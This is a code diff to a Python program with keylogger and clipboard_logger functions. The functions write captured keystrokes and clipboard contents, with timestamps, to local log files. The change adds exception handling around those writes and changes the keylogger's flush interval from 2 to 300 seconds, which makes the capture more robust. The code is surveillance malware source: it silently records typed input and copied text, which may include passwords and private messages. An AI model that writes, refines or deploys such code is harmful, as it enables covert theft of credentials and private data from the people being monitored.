@@ -70,11 +70,14 @@ def keylogger(status):
             if len(key_queue):
                 with open(statics.KEYLOGGER_FILE_PATH, "a+") as f:
                     logger.debug("OPENED KEYLOGGER FUNC")
-                    f.write(f"[{datetime.datetime.now()}] ")
-                    while len(key_queue) > 0:
-                        f.write(str(key_queue.pop(0)))
-                    f.write("\n")
-        time.sleep(2)
+                    try:
+                        f.write(f"[{datetime.datetime.now()}] ")
+                        while len(key_queue) > 0:
+                            f.write(str(key_queue.pop(0)))
+                        f.write("\n")
+                    except Exception as e:
+                        logger.error("Encountered error while trying to set keylog - "+str(e))
+        time.sleep(300)
 
 
 def clipboard_logger(status):
@@ -85,5 +88,8 @@ def clipboard_logger(status):
             prevClip = cClip
             with open(statics.CLIPBOARD_FILE_PATH, "a+") as f:
                 logger.debug("OPENED CLIPBOARD FUNC")
-                f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
+                try:
+                    f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
+                except Exception as e:
+                    logger.error("Encountered error while trying to set clipboard - " + str(e))
         time.sleep(2)
